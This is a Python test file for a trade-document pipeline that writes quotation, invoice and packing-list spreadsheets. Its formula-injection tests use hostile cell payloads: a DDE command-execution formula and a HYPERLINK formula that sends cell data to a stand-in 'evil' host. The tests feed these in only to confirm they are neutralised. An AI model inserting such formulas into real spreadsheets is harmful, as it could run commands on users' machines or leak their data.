"""Smoke tests for Writer modules (Quote/PI/CI/PL)."""
import tempfile
from pathlib import Path

from openpyxl import load_workbook

from tests.conftest import make_resolved_model, SAMPLE_CONFIG
from trade_pipeline.writers.quote_writer import QuoteWriter
from trade_pipeline.writers.pi_writer import PIWriter
from trade_pipeline.writers.ci_writer import CIWriter, amount_to_words
from trade_pipeline.writers.pl_writer_lite import PLWriterLite


# ── QuoteWriter ──────────────────────────────────────────────────


def test_quote_generates_valid_xlsx():
    model = make_resolved_model()
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        result = QuoteWriter(model, SAMPLE_CONFIG).write(path)

        assert Path(path).exists()
        assert result["items"] == 2
        assert result["uuid_col"] == 9
        assert result["uuid_col_letter"] == "I"
        assert result["data_start_row"] > 1

        wb = load_workbook(path)
        ws = wb.active
        assert ws.title == "Quotation"
        assert ws.column_dimensions["I"].hidden is True

        uuid_vals = [ws.cell(r, 9).value for r in range(result["data_start_row"],
                     result["data_start_row"] + result["items"])]
        assert "abc123def456" in uuid_vals
        assert "xyz789ghi012" in uuid_vals
    finally:
        Path(path).unlink(missing_ok=True)


def test_quote_price_column_highlighted():
    model = make_resolved_model()
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        result = QuoteWriter(model, SAMPLE_CONFIG).write(path)
        wb = load_workbook(path)
        ws = wb.active
        price_cell = ws.cell(result["data_start_row"], 6)
        assert price_cell.fill.fgColor.rgb is not None
    finally:
        Path(path).unlink(missing_ok=True)


# ── PIWriter ─────────────────────────────────────────────────────


def test_pi_generates_with_correct_structure():
    model = make_resolved_model(with_prices=True)
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        result = PIWriter(model, SAMPLE_CONFIG).write(path)

        assert Path(path).exists()
        assert result["pi_number"] == "PI-TEST01"
        assert result["items"] == 2

        wb = load_workbook(path)
        ws = wb.active
        assert ws.title == "PI"
    finally:
        Path(path).unlink(missing_ok=True)


# ── CIWriter ─────────────────────────────────────────────────────


def test_ci_generates_with_total_amount():
    model = make_resolved_model(with_prices=True)
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        result = CIWriter(model, SAMPLE_CONFIG).write(path)

        assert Path(path).exists()
        assert result["ci_number"] == "CI-TEST01"
        expected_total = 28.50 * 50000 + 12.00 * 100000
        assert result["total_amount"] == expected_total

        wb = load_workbook(path)
        ws = wb.active
        assert ws.title == "CI-TEST01"
    finally:
        Path(path).unlink(missing_ok=True)


# ── amount_to_words ──────────────────────────────────────────────


def test_amount_to_words_zero():
    assert amount_to_words(0, "USD") == "USD ZERO ONLY"


def test_amount_to_words_with_cents():
    result = amount_to_words(1234.56, "USD")
    assert "ONE THOUSAND" in result
    assert "TWO HUNDRED" in result
    assert "THIRTY" in result
    assert "FOUR" in result
    assert "FIFTY" in result
    assert "SIX CENTS" in result
    assert result.endswith("ONLY")


def test_amount_to_words_million():
    result = amount_to_words(1000000, "EUR")
    assert "EUR" in result
    assert "ONE MILLION" in result
    assert result.endswith("ONLY")


def test_amount_to_words_whole_number():
    result = amount_to_words(500, "USD")
    assert "FIVE HUNDRED" in result
    assert "CENTS" not in result
    assert result.endswith("ONLY")


# ── PLWriterLite ─────────────────────────────────────────────────


def test_pl_lite_computes_packing():
    model = make_resolved_model(with_weights=True)
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        result = PLWriterLite(model, SAMPLE_CONFIG).write(path)

        assert Path(path).exists()
        assert result["success"] is True
        assert result["total_cartons"] > 0
        assert result["total_pallets"] > 0
        assert result["total_net_weight"] > 0

        wb = load_workbook(path)
        ws = wb.active
        assert ws.title == "PACKING LIST"
    finally:
        Path(path).unlink(missing_ok=True)


def test_pl_raises_when_weights_missing():
    """Safety net: PL must refuse to generate when no weight info available."""
    import pytest
    from trade_pipeline.writers.pl_writer_lite import PackingInfoMissingError

    model = make_resolved_model(with_weights=False)  # no weight_kg, no kg_mpcs
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        with pytest.raises(PackingInfoMissingError) as exc_info:
            PLWriterLite(model, SAMPLE_CONFIG).write(path)
        assert len(exc_info.value.missing_items) == 2
        assert "缺少重量信息" in str(exc_info.value)
    finally:
        Path(path).unlink(missing_ok=True)


def test_pl_allow_missing_weight_flag_bypasses_check():
    """Escape hatch: explicit allow_missing_weight=True still generates (for demos)."""
    model = make_resolved_model(with_weights=False)
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        result = PLWriterLite(model, SAMPLE_CONFIG).write(path, allow_missing_weight=True)
        assert result["success"] is True
        assert Path(path).exists()
    finally:
        Path(path).unlink(missing_ok=True)


# ── 公式注入净化（T3）────────────────────────────────────────────


def test_sc_sanitizes_formula_injection():
    """base_writer.sc(): 以 = + - @ 开头的输入字符串被前置 ' 转为文本，非公式。"""
    from openpyxl import Workbook
    from trade_pipeline.writers.base_writer import sc

    wb = Workbook()
    ws = wb.active
    payloads = [
        "=cmd|'/c calc'!A1",
        '=HYPERLINK("http://evil/?x="&A1,"CLICK")',
        "+1+1",
        "-2-2",
        "@SUM(A1)",
    ]
    for i, p in enumerate(payloads, 1):
        cell = sc(ws, i, 1, value=p)
        assert cell.data_type != "f", f"payload 未被净化为文本: {p!r}"
        assert cell.value == "'" + p


def test_sc_formula_flag_exempts_intentional_formula():
    """formula=True: 刻意写的金额公式仍作为公式（data_type == 'f'），不被净化。"""
    from openpyxl import Workbook
    from trade_pipeline.writers.base_writer import sc

    wb = Workbook()
    ws = wb.active
    cell = sc(ws, 1, 1, value="=SUM(A1:A9)", formula=True)
    assert cell.data_type == "f"
    assert cell.value == "=SUM(A1:A9)"


def test_sc_leaves_safe_strings_and_numbers():
    """普通字符串与数字不受影响。"""
    from openpyxl import Workbook
    from trade_pipeline.writers.base_writer import sc

    wb = Workbook()
    ws = wb.active
    assert sc(ws, 1, 1, value="HEX BOLT M8").value == "HEX BOLT M8"
    assert sc(ws, 2, 1, value=42).value == 42


def test_ci_writer_sanitizes_malicious_description_but_keeps_amount_formula():
    """端到端：CI 里恶意 description 被净化为文本，金额公式仍是公式。"""
    model = make_resolved_model(with_prices=True, with_weights=True)
    model.items[0].description = "=cmd|'/c calc'!A1"
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        CIWriter(model, SAMPLE_CONFIG).write(path)
        wb = load_workbook(path)
        ws = wb.active
        found_malicious_text = False
        found_amount_formula = False
        for row in ws.iter_rows():
            for cell in row:
                if isinstance(cell.value, str) and cell.value == "'=cmd|'/c calc'!A1":
                    found_malicious_text = True
                    assert cell.data_type != "f"
                if cell.data_type == "f" and isinstance(cell.value, str) and cell.value.startswith("="):
                    found_amount_formula = True
        assert found_malicious_text, "恶意 description 未被净化为文本"
        assert found_amount_formula, "金额/合计公式应仍是 Excel 公式"
    finally:
        Path(path).unlink(missing_ok=True)


def test_quote_writer_sanitizes_malicious_barcode():
    """quote_writer 自带 _mc / 直写 cell，也必须净化输入数据。"""
    model = make_resolved_model()
    model.items[0].barcode = '=HYPERLINK("http://evil/?x="&A1,"CLICK")'
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        path = f.name
    try:
        QuoteWriter(model, SAMPLE_CONFIG).write(path)
        wb = load_workbook(path)
        ws = wb.active
        hits = [
            cell for row in ws.iter_rows() for cell in row
            if isinstance(cell.value, str) and cell.value.startswith("'=HYPERLINK")
        ]
        assert hits, "恶意 barcode 未被净化"
        for cell in hits:
            assert cell.data_type != "f"
    finally:
        Path(path).unlink(missing_ok=True)


# ── CI/PL 毛重一致（T1）──────────────────────────────────────────


def _read_ci_gross_weight(path: str) -> float:
    """从 CI 的 'N.W.:... G.W.:...KGS' 页脚文本抠出 G.W. 值。"""
    import re
    wb = load_workbook(path)
    ws = wb.active
    for row in ws.iter_rows():
        for cell in row:
            if isinstance(cell.value, str) and "G.W.:" in cell.value:
                m = re.search(r"G\.W\.:\s*([\d,]+\.\d+)", cell.value)
                if m:
                    return float(m.group(1).replace(",", ""))
    raise AssertionError("CI 页脚未找到 G.W.")


def test_ci_gross_weight_equals_pl_when_pl_runs_first():
    """T1: PL 先跑回写 derived.total_gross_weight → CI 读真值，两者 G.W. 相等，
    且 CI 不再走 nw*1.036 兜底。"""
    model = make_resolved_model(with_prices=True, with_weights=True)
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f1:
        pl_path = f1.name
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f2:
        ci_path = f2.name
    try:
        # 顺序与修复后的 pipeline 一致：先 PL 后 CI
        pl_result = PLWriterLite(model, SAMPLE_CONFIG).write(pl_path)
        ci_info = CIWriter(model, SAMPLE_CONFIG).write(ci_path)

        pl_gw = pl_result["total_gross_weight"]
        # CI 返回值与页脚文本都应等于 PL 真值
        assert ci_info["total_gross_weight"] == pl_gw
        assert _read_ci_gross_weight(ci_path) == pl_gw

        # 证明 CI 读的是真值而非兜底：兜底会是 nw*1.036
        nw = ci_info["total_net_weight"]
        fallback = round(nw * 1.036, 2)
        assert pl_gw != fallback, "本 fixture 下真值应与 1.036 兜底不同，才能证明读到真值"
    finally:
        Path(pl_path).unlink(missing_ok=True)
        Path(ci_path).unlink(missing_ok=True)


def test_ci_gross_weight_falls_back_when_pl_not_run():
    """回归：PL 未跑（derived 无毛重）时 CI 仍走 nw*1.036 兜底，不崩。"""
    model = make_resolved_model(with_prices=True, with_weights=True)
    model.derived.total_gross_weight = None
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        ci_path = f.name
    try:
        ci_info = CIWriter(model, SAMPLE_CONFIG).write(ci_path)
        nw = ci_info["total_net_weight"]
        assert ci_info["total_gross_weight"] == round(nw * 1.036, 2)
    finally:
        Path(ci_path).unlink(missing_ok=True)
